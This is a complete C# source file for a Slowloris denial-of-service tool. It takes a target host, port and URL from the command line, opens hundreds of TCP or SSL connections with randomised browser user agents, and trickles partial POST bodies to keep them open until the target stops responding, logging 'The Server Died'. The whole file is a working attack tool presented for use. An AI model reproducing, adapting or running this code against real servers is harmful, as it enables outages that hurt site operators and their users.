using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using CommandLine;
using System.Threading;
using System.IO;
using System.Net.Security;

namespace slowloris
{
    class Options
    {
        [Option('a',  "address", Required = true,
            HelpText = "The DNS address or IP address of the target server that you wish to perform the attack on.")]
        public string Address { get; set; }

        [Option('u', "url", DefaultValue = "/",
          HelpText = "The page to attack.")]
        public string URL { get; set; }

        [Option("ssl", DefaultValue = false,
          HelpText = "Whether or not to use SSL.")]
        public bool SSL { get; set; }

        [Option('p', "port", DefaultValue = 80,
         HelpText = "The port to attack on the target server.")]
        public int Port { get; set; }

        [Option('s', "sockets", DefaultValue = 200,
          HelpText = "The number of sockets that will be used to hog connections!")]
        public int Sockets { get; set; }

        [Option('t', "timeout", DefaultValue = 15,
          HelpText = "The time between each keep alive!")]
        public int Timeout { get; set; }
    }

    class Program
    {
        private static int FailCountBeforeError = 10;
        private static readonly object ConsoleWriterLock = new object();

        static void Main(string[] args)
        {
            // For Debugging 
            // System.Diagnostics.Debugger.Launch();

            Console.Title = "Slow Loris";
            Console.ForegroundColor = ConsoleColor.White;

            #region Command Line Args
            Options cmdargs = new Options();
            bool cmdargscheck = Parser.Default.ParseArgumentsStrict(args, cmdargs);

            if (!cmdargscheck)
            {
                Console.WriteLine(" [-] Failed to parse command line arguments!");
                Console.ReadLine();
                Environment.Exit(1);
            }

            Console.WriteLine(" [*] Target: " + cmdargs.Address);

            string ip = Dns.GetHostAddresses(cmdargs.Address)[0].ToString();
            if (ip != cmdargs.Address)
            {
                Console.WriteLine(" [*] Target's IP Resolved To: " + ip);
            }

            Console.WriteLine(" [*] Port: " + cmdargs.Port);

            if (cmdargs.Sockets <= 99)
            {
                ConsoleColor before = Console.ForegroundColor;
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine(" [-] Error - You require at least 100 Sockets!");
                Console.ForegroundColor = before;
                return;
            }

            if (cmdargs.Sockets != 200)
            {
                Console.WriteLine(" [+] Sockets: " + cmdargs.Sockets);
            }

            if (cmdargs.Timeout <= 4)
            {
                ConsoleColor before = Console.ForegroundColor;
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine(" [-] Error - You require at least 5 seconds for the Timeout!");
                Console.ForegroundColor = before;
                return;
            }

            if (cmdargs.Timeout != 15)
            {
                Console.WriteLine(" [+] Timeout: " + cmdargs.Timeout);
            }
            #endregion

            Console.WriteLine("\r\n [*] Starting Slow Loris...");

            SlowLoris(cmdargs.Address, ip, cmdargs.URL, cmdargs.Port, cmdargs.Sockets, cmdargs.Timeout, cmdargs.SSL);

            Console.WriteLine(" [*] Started Slow Loris...");

            Console.ReadLine();
        }

        #region SlowLorisVars
        private static Random UserAgentRandomizer = new Random(DateTime.UtcNow.Millisecond);
        private static List<string> UserAgents = new List<string>() {
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"
        };
        #endregion
        private static void SlowLoris(string address, string ip, string url, int port, int sockets, int timeout, bool ssl)
        {
            // Left this way after a failed attempt at multi-threading
            // I was not seeing any performance benefits
            Thread X = new Thread(() =>
            {
                SlowLorisWorker(address, ip, url, port, sockets, timeout, ssl);
            });

            X.Start();
        }

        #region Slow Loris Worker
        private static void SlowLorisWorker(string address, string ip, string url, int port, int sockets, int timeout, bool ssl)
        {
            List<SlowLorisConnection> SlowLorisConnections = new List<SlowLorisConnection>();
            new Thread(() => KeepAlive(sockets, timeout, SlowLorisConnections)).Start();

            int ConsectutiveFailures = 0;
            while (SlowLorisConnections.Count < sockets)
            {
                // Add New Connection
                try
                {
                    SlowLorisConnection slc = new SlowLorisConnection(address, ip, url, ssl, port, UserAgents[UserAgentRandomizer.Next(0, UserAgents.Count - 1)]);
                    SlowLorisConnections.Add(slc);
                    ConsectutiveFailures = 0;
                }
                catch (Exception EX)
                {
                    if (ConsectutiveFailures >= FailCountBeforeError)
                    {
                        lock (ConsoleWriterLock)
                        {
                            ConsoleColor before = Console.ForegroundColor;
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine(" [*] The Server Died at " + DateTime.Now);
                            Console.ForegroundColor = before;
                        }
                    }
                    ConsectutiveFailures++;
                }
            }
        }

        private static void KeepAlive(int sockets, int timeout, List<SlowLorisConnection> SlowLorisConnections)
        {
            ConsoleColor before = Console.ForegroundColor;

            while (true)
            {
                bool died = false;

                for (int x = 0; x < SlowLorisConnections.Count; x++)
                {
                    try
                    {
                        SlowLorisConnections[x].SendKeepAlive();
                    }
                    catch (Exception)
                    {
                        // Remove Dead Connection
                        SlowLorisConnections.Remove(SlowLorisConnections[x]);

                        // Add New Connection
                        if (SlowLorisConnections.Count < sockets)
                        {
                            try
                            {
                                SlowLorisConnection slc = new SlowLorisConnection(SlowLorisConnections[x].address, SlowLorisConnections[x].ip, SlowLorisConnections[x].url, SlowLorisConnections[x].ssl, SlowLorisConnections[x].port, UserAgents[UserAgentRandomizer.Next(0, UserAgents.Count - 1)]);
                                SlowLorisConnections.Add(slc);
                            }
                            catch (Exception)
                            {
                                lock (ConsoleWriterLock)
                                {
                                    Console.ForegroundColor = ConsoleColor.Red;
                                    Console.WriteLine(" [*] The Server Died at " + DateTime.Now);
                                    Console.ForegroundColor = before;
                                }
                                died = true;
                            }
                        }
                    }
                }

                if (SlowLorisConnections.Count != 0 && !died)
                {
                    lock (ConsoleWriterLock)
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine(" [+] Sent Keep Alive to {0} connections!", SlowLorisConnections.Count);
                        Console.ForegroundColor = before;
                    }
                }

                // Sleep For timeout After Every Itteration
                // So that the computer doesnt explode
                Thread.Sleep(timeout * 1000);
            }
        }
        #endregion
    }

    #region Slow Loris Connection
    internal class SlowLorisConnection
    {
        public string address { get; private set; }
        public string ip { get; private set; }
        public string url { get; private set; }
        public bool ssl { get; private set; }
        public int port { get; private set; }
        private Random randomizer;
        private StreamWriter TCPWriter;
        private SslStream SSLWriter;

        public SlowLorisConnection(string address, string ip, string url, bool ssl, int port, string ua) {
            this.address = address;
            this.ip = ip;
            this.url = url;
            this.ssl = ssl;
            this.port = port;
            randomizer = new Random(DateTime.UtcNow.Millisecond);

            // Connect & Check for Timeout
            TcpClient TCPClient = new TcpClient();
            var result = TCPClient.BeginConnect(ip, port, null, null);

            var success = result.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(3));
            if (!success)
            {
                throw new Exception("Connection Timed Out!");
            }

            string Request = $"POST {url} HTTP/1.1\r\nContent-type: application/x-www-form-urlencoded\r\n" +
                $"{string.Format("Content-Length: {0}", randomizer.Next(0, 5000))}\r\n{string.Format("User-Agent: {0}", ua)}\r\nAccept-language: en-US,en,q=0.5\r\n";

            if (ssl)
            {
                SSLWriter = new SslStream(TCPClient.GetStream());

                // How do  I allow snake oil certs
                try
                {
                    SSLWriter.AuthenticateAsClient(address);
                }
                catch (Exception) {

                }


                SSLWriter.Write(Encoding.UTF8.GetBytes(Request));

                SSLWriter.Flush();
            }
            else
            {
                TCPWriter = new StreamWriter(TCPClient.GetStream());

                TCPWriter.Write(Request);

                TCPWriter.Flush();
            }
        }

        private List<string> postvalues = new List<string>() {
            "&username={0}",
            "&email={0}",
            "&password={0}",
            "&data={0}",
            "&file={0}",
            "&text={0}",
            "&search={0}",
            "&value={0}"
        };

        public void SendKeepAlive() {
            if (TCPWriter != null && SSLWriter == null)
            {
                TCPWriter.Write(string.Format(postvalues[randomizer.Next(0, postvalues.Count)], randomizer.Next(1, 5000)));

                TCPWriter.Flush();
            }
            else if (TCPWriter == null && SSLWriter != null)
            {
                SSLWriter.Write(Encoding.UTF8.GetBytes(string.Format(postvalues[randomizer.Next(0, postvalues.Count)], randomizer.Next(1, 5000))));

                SSLWriter.Flush();
            }
            else {
                throw new Exception("Unexcpected Stream Configuration");
            }
        }
    }
    #endregion
}
